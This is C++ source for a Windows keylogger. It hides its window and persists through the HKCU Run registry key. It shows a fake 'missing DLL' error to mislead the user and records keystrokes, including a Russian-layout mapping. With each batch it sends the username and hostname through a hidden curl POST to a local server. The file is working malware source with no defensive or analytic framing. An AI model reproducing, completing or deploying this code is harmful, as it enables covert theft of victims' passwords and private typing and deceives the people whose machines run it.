#define _CRT_SECURE_NO_WARNINGS

#include <limits.h>
#include <stdio.h>
#include <stdlib.h>

#include <map>
#include <vector>

#include "framework.h"
#include "keylogger.h"

#include "json.hpp"

using namespace nlohmann;

#define FILE_NAME_ERR_RU "tool.exe - Системная ошибка"
#define FILE_NAME_ERR_EN "tool.exe - System error"

#define KEY_MIN VK_SPACE
#define KEY_MAX (int)'Z'

#define RUS_UTF8_OFFSET 1000
#define INFO_BUFFER_SIZE 32767

#define len(obj) obj.size()
#define BUF_SIZE 100

HINSTANCE hInst;
WCHAR szTitle[MAX_LOADSTRING];
WCHAR szWindowClass[MAX_LOADSTRING];

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow);
ATOM MyRegisterClass(HINSTANCE hInstance);
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

std::map<short, int> EN_VK2RU_UTF8 = {
    {81, 1081} // Q : й  
    , {87, 1094} // W : ц 
    , {69, 1091} // E : у
    , {82, 1082} // R : к
    , {84, 1077} // T : е
    , {89, 1085} // Y : н
    , {85, 1075} // U : г
    , {73, 1096} // I : ш
    , {79, 1097} // O : щ
    , {80, 1079} // P : з
    , {65, 1092} // A : ф
    , {83, 1099} // S : ы
    , {68, 1074} // D : в
    , {70, 1072} // F : а
    , {71, 1087} // G : п
    , {72, 1088} // H : р
    , {74, 1086} // J : о
    , {75, 1083} // K : л
    , {76, 1076} // L : д
    , {90, 1103} // Z : я
    , {88, 1095} // X : ч
    , {67, 1089} // C : с
    , {86, 1084} // V : м
    , {66, 1080} // B : и
    , {78, 1090} // N : т
    , {77, 1100} // M : ь
    , {44, 1073} // , : б
    , {46, 1102} // . : ю
};

namespace win {
	const HKL ru = LoadKeyboardLayout("00000419", 0);
	const HKL en = LoadKeyboardLayout("00000409", 0);
	const LCID ru_lcid = MAKELCID(MAKELANGID(LANG_RUSSIAN, SUBLANG_DEFAULT), SORT_DEFAULT);
	const LCID en_lcid = MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT), SORT_DEFAULT);
	
    static void auto_run();
    static void fake_err_message();
    static HKL get_keyboard_layout();
	static LCID get_locale();
    static void curl_post(const json &j);
    static std::string get_username();
    static std::string get_compname();
}

void win::auto_run() {
    char arr[MAX_PATH] = { };

	::GetModuleFileNameA(NULL, arr, MAX_PATH);

    HKEY hKey;

    if (
        RegCreateKeyEx(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
		
        if (RegSetValueEx(hKey, "tool", NULL, REG_SZ, (LPBYTE)arr, sizeof(arr) + 1)) {
            RegCloseKey(hKey);
        }
        return;
    }
}

void win::fake_err_message() {
    const LCID lcid = win::get_locale();

	LPCSTR title = (lcid == win::ru_lcid) ? FILE_NAME_ERR_RU : FILE_NAME_ERR_EN;
	LPCSTR message = (lcid == win::ru_lcid) ? 
        "Запуск программы не возможен, так как на компьютере отсутствует файл DLL. Попробуйте переустановить программу"
        :
	    "Program launch is impossible, because there is no file DLL on the computer. Try to reinstall the program";

    MessageBox(GetActiveWindow(), message, title, MB_ICONERROR);
}

HKL win::get_keyboard_layout() {
    GUITHREADINFO GTI;
    ::ZeroMemory(&GTI, sizeof(GUITHREADINFO));
    GTI.cbSize = sizeof(GUITHREADINFO);
    ::GetGUIThreadInfo(NULL, &GTI);

    const DWORD dwThread = GetWindowThreadProcessId(GTI.hwndActive, NULL);
    const HKL layout = GetKeyboardLayout(dwThread);

    return layout;
}

LCID win::get_locale() {
    const LCID lcid = LOCALE_USER_DEFAULT;

    return lcid;
}

std::string win::get_username() {
    TCHAR infobuf[INFO_BUFFER_SIZE];
	DWORD cch = INFO_BUFFER_SIZE;

	if (GetUserName(infobuf, &cch)) {
		return std::string(infobuf);
	}
	return std::string("unknown");
}

std::string win::get_compname() {
    TCHAR infobuf[INFO_BUFFER_SIZE];
	DWORD cch = INFO_BUFFER_SIZE;

	if (GetComputerName(infobuf, &cch)) {
		return std::string(infobuf);
	}
    return std::string("unknown");
}

void win::curl_post(const json &j) {
    std::string json_str = j.dump();

	std::string s_command = "curl -X POST http://localhost:8000 --data-bin \"" + json_str + "\"";

    LPCSTR command = s_command.c_str();
		
	WinExec(command, SW_HIDE);
}

BOOL InitInstance(HINSTANCE hInstance, int cmdShow) {
    hInst = hInstance;

    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
	
    if (!hWnd) {
        return FALSE;
    }
	
    ::ShowWindow(hWnd, SW_HIDE);
    ::UpdateWindow(hWnd);
	
    return TRUE;
}

ATOM MyRegisterClass(HINSTANCE hInstance) {
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_KEYLOGGER));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_KEYLOGGER);
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
	return DefWindowProc(hWnd, message, wParam, lParam);
}

int APIENTRY wWinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow
) {
    ::win::auto_run();
    ::win::fake_err_message();

    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_KEYLOGGER, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    json j;

    std::string buffer;

    j["\"system_lang\""] = '\"' + win::get_locale() + '\"';
    j["\"hostname\""] = '\"' + win::get_compname() + '\"';
    j["\"username\""] = '\"' + win::get_username() + '\"';

	HKL layout = win::get_keyboard_layout();

    std::string old;
    
    for (;;) {
        layout = win::get_keyboard_layout();
		
        for (short key = KEY_MIN; key <= KEY_MAX; ++key) {
            if (GetAsyncKeyState(key) == std::numeric_limits<short>::lowest()) {
                if (key == VK_SPACE) {
                    if (old != "32:") {
                        buffer += std::to_string(32) + ":";
                    }       
                }
                if (key >= 'A' && key <= 'Z') {
                    std::string out = ((layout == win::ru) ? std::to_string(EN_VK2RU_UTF8[key]) : std::to_string(key + 32)) + ":";       

                    if (out != old) {
                        buffer += out;

                        old = out;
                    }              
                }
                Sleep(30);
            }
        }

        if (len(buffer) >= BUF_SIZE) {
            j["\"text\""] = '\"' + buffer + '\"';
			
            ::win::curl_post(j);

            buffer = "";
        }

        Sleep(10);
    }
	
    return 0;
}